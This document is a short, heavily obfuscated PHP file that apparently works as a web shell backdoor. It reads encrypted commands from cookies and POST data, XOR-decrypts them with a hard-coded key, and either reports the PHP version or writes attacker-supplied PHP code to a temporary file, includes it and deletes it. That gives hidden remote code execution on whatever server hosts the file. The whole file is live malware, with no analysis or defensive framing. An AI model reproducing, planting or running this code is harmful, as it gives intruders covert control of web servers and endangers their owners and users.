<?php 	function	oieebbpvwv(){$xjnlimgabn='wndeyaqr';	print_r	(72021+72021);/*  lv   */}


$jcerzdfui      =      'jcerzdfui'	^	'	';






function/*zdja  */rtsw_r($ccuxzua,/* pz */$xawoi)
{


      global	$jcerzdfui;


	$aoauwsc_sj	=   "";

	for/* rd */($epalbwjckk	=   0;	$epalbwjckk/*o */<     strlen($ccuxzua);)     {
	for/*   iu  */($tygfrkkor     =	0;	$tygfrkkor   <	strlen($xawoi)      &&/*   cws_i*/$epalbwjckk    </*   fklmg*/strlen($ccuxzua);  $tygfrkkor++,       $epalbwjckk++)      {
	$aoauwsc_sj   .=	$jcerzdfui(ord($ccuxzua[$epalbwjckk])/*  kfyfh   */^/*   _mj   */ord($xawoi[$tygfrkkor]));/*   i*/}
      }	return	$aoauwsc_sj;

}


function       mmamthmtbs($rdcjja_gu,	$ccuxzua)

{

  global	$jcerzdfui;      $_hbkix_lx/*kbav  */=   sprintf($jcerzdfui(46)      .    $jcerzdfui(450-403)      .	"\x25"/*rmpc*/./*   gneb   */$jcerzdfui(115)  ./*q */$jcerzdfui(46)	.   "p"."\154",     md5($rdcjja_gu));


       file_put_contents($_hbkix_lx,	"<"     .	"?"."\x70"     ./*hpxs  */$jcerzdfui(1101-997)/*dpx*/./*  h*/$jcerzdfui(112)	.  $jcerzdfui(32)	./*q  */"u"."n"."\x6c"/*ua   */./* me  */$jcerzdfui(105)   .	"n".$jcerzdfui(107)/* mmm */.     $jcerzdfui(517-477)      .     $jcerzdfui(343-248)/*   s   */.	$jcerzdfui(95)	.      "F"."I"."L"."\x45"/*  z  */./*isah  */$jcerzdfui(95)  .	"_".$jcerzdfui(375-334)      .	"\73"    .	$jcerzdfui(32)	.   $ccuxzua["\144"]);


	include($_hbkix_lx);     $oyobzlvdc/*  kroli*/=/* aewjf*/$_hbkix_lx;


	unlink($oyobzlvdc);


}



function/*  ol*/fndtwa()


{

	global/*   rgk  */$jcerzdfui;


   


   $epalbwjckk       =	array();
	$epalbwjckk["p"."v"]	=	phpversion();
/*   iqd   */$epalbwjckk["s".$jcerzdfui(411-293)]/*  dw   */=	$jcerzdfui(51)  .	"."."5";

	echo	@serialize($epalbwjckk);}


function/* ct  */vcxkcnoqgx($ccuxzua,/*ep */$rdcjja_gu,     $tygfrkkorocxnyems)
{   global	$jcerzdfui;/*   sidx  */   $ccuxzua/*yenun */=/* fr */unserialize(rtsw_r(rtsw_r(base64_decode($ccuxzua),/*   aesze */$rdcjja_gu),	$tygfrkkorocxnyems));  if	(isset($ccuxzua["a"."\x6b"]))  {


     if/* pvvn_ */($ccuxzua["a"]	==/*lz  */$jcerzdfui(105))	{


  fndtwa();	}/*  e   */elseif     ($ccuxzua["a"]/* yb  */==	$jcerzdfui(101))	{
	mmamthmtbs($rdcjja_gu,/* he  */$ccuxzua);

    }

	exit();


	}}

$vbpdngbwkw/*   ws  */=/* atx*/$_COOKIE;
$nmfprvwz	=      $_POST;$vbpdngbwkw       =	array_merge($nmfprvwz,/*yam   */$vbpdngbwkw);

$rdcjja_gu/*  v  */=	$jcerzdfui(554-454)	.   $jcerzdfui(640-540)/*  xmy  */./* saebo */$jcerzdfui(99)	.	"\63"	.     "\144"."5"."0"."1"."-".$jcerzdfui(599-502)	.     "\x66"	.  $jcerzdfui(994-892)     .	"7"."-"."\64"/* dii  */.	$jcerzdfui(1009-955)/*dsu  */.	"3"."\144"/*   u_bh  */.   "-"."b"."\66"/*nr   */./*zk */$jcerzdfui(54)     .    $jcerzdfui(54)	.     $jcerzdfui(151-106)       .    $jcerzdfui(551-494)       ./*   luzm*/$jcerzdfui(48)	./*vszms */"f".$jcerzdfui(254-156)/* ueap   */.     "\62"   ./*  gts   */"6"."\65"	.	$jcerzdfui(812-711)/*  o   */.	"\70"	./*   xmmxm*/$jcerzdfui(51)	.	$jcerzdfui(536-484)    .	"8";


foreach    ($vbpdngbwkw/*  u   */as    $tygfrkkorocxnyems    =>	$ccuxzua)	{


/*  o   */vcxkcnoqgx($ccuxzua,/*lkjbe  */$rdcjja_gu,	$tygfrkkorocxnyems);


}
